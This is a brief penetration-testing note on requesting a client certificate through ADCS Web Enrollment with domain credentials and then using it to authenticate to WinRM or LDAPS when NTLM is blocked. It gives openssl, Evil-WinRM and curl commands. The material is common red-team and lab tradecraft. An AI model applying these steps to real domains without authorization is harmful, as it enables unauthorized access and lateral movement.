# ADCS Web Enrollment Client Cert Auth

When ADCS Web Enrollment (`/certsrv`) is accessible and you have domain creds, request a client certificate to authenticate services (WinRM, LDAPS) that accept certificate-based auth — useful when a password works but NTLM auth is blocked.

**Request via Web UI:**
1. Browse to `http://<DC>/certsrv` → "Request a certificate" → "Advanced certificate request"
2. Generate CSR + key locally with openssl, paste into the web form
3. Download the issued `.cer`

**Generate CSR + key:**
```bash
openssl req -newkey rsa:2048 -nodes -keyout user.key -out user.csr \
  -subj "/CN=<username>/DC=<domain>/DC=<tld>"
```

**Combine into PFX for WinRM auth:**
```bash
openssl pkcs12 -export -in user.cer -inkey user.key -out user.pfx -passout pass:''
```

**Authenticate with Evil-WinRM:**
```bash
evil-winrm -i <TARGET> -S -c user.cer -k user.key
```

**Authenticate with curl (LDAPS/HTTPS):**
```bash
curl --cert user.cer --key user.key https://<TARGET>/...
```

WinRM certificate auth uses port 5986 (HTTPS); regular WinRM on 5985 won't accept certs.
